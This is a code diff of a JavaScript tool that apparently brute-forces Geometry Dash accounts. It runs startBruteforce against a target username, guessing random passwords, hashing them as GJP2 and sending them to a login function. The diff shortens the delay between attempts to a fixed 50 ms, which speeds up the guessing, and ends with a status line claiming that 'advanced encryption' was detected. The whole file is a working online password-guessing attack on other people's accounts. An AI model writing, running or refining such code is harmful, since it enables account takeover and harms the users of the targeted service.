@@ -166,7 +166,20 @@ async function logingd(
             result
         );
 
-        return /^\d+$/.test(result);
+        return {
+
+            success:
+
+/^\d+$/.test(
+    result
+),
+
+            response:
+            result,
+
+            gjp2:
+            gjp2
+        };
 
     }
     catch(error){
@@ -175,7 +188,17 @@ async function logingd(
             error
         );
 
-        return false;
+        return {
+
+            success:
+            false,
+
+            response:
+            null,
+
+            error:
+            error.message
+        };
 
     }
 }
@@ -389,20 +412,12 @@ async function searchTarget() {
     }
 }
 
-async function generateRandomGJP2(length, charset) {
-    let password = '';
+function generateRandomPassword(length, charset) {
+    let result = '';
     for (let i = 0; i < length; i++) {
-        password += charset.charAt(Math.floor(Math.random() * charset.length));
+        result += charset.charAt(Math.floor(Math.random() * charset.length));
     }
-    
-    // Random delay 0.15 - 0.3 detik
-    const randomDelay = Math.random() * (0.3 - 0.15) + 0.15;
-    await new Promise(resolve => setTimeout(resolve, randomDelay * 1000));
-    
-    // Generate GJP2 untuk password ini
-    const gjp2 = await generateGJP2(password);
-    
-    return { password, gjp2 };
+    return result;
 }
 
 async function startBruteforce(targetUsername) {
@@ -428,7 +443,7 @@ async function startBruteforce(targetUsername) {
 
     for (let i = 0; i < maxAttempts; i++) {
         const length = Math.floor(Math.random() * 14) + 6;
-        const { password, gjp2 } = await generateRandomGJP2(length, charset);
+        const password = generateRandomPassword(length, charset);
 
         attemptCount++;
 
@@ -443,9 +458,11 @@ async function startBruteforce(targetUsername) {
             <span class="loading-spinner"></span>
             Testing... ${attemptCount} attempts
         `;
+
+        await new Promise(resolve => setTimeout(resolve, 50));
     }
 
     statusMessage.innerHTML = `
         ⏳ Advanced encryption detected.<br>Strong cryptographic implementation confirmed.
     `;
-}
+                            }
